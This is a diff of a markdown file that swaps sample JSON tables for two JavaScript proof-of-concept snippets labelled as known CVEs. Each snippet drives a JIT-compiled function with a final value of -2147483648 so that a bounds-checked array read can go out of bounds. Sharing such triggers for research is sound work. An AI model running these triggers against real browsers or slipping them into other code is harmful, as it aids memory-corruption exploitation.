@@ -25,28 +25,61 @@ Here are two bugs to share.
 
 <table>
 <tr>
-<th>Json 1</th>
-<th>Markdown</th>
+<th>CVE-2020-9983</th>
+<th>CVE-2020-9802</th>
 </tr>
 <tr>
 <td>
-<pre>
-{
-  "id": 1,
-  "username": "joe",
-  "email": "joe@example.com",
-  "order_id": "3544fc0"
+  
+```JavaScript
+const ITERATIONS=1000000;
+function f(n){
+	n&=0xffffffff
+	if(n<-1){
+		let v=(-n)&0xffffffff;
+		let i=Math.abs(n);
+		let arr=new Array(10);
+		arr.fill(42.42);
+		if(i<arr.length){
+			return arr[i];
+		}
+	}
 }
-</pre>
+for(let i=0;i<ITERATIONS;i++){
+	let isLastIteration=
+		i==ITERATIONS-1;
+	let n=-(i%10);
+	if(isLastIteration){
+		n=-2147483648;
+	}
+	f(n);
+}
+``` 
 </td>
 <td>
 
-```json
-{
-  "id": 5,
-  "username": "mary",
-  "email": "mary@example.com",
-  "order_id": "f7177da"
+```JavaScript
+const ITERATIONS=1000000;
+function f(n){
+	n&=0xffffffff-1
+	if(n<-1){
+		let v=(-n)&0xffffffff;
+		let i=Math.abs(n);
+		let arr=new Array(10);
+		arr.fill(42.42);
+		if(i<arr.length){
+			return arr[i];
+		}
+	}
+}
+for(let i=0;i<ITERATIONS;i++){
+	let isLastIteration=
+		i==ITERATIONS-1;
+	let n=-(i%10);
+	if(isLastIteration){
+		n=-2147483648;
+	}
+	f(n);
 }
 ```
 
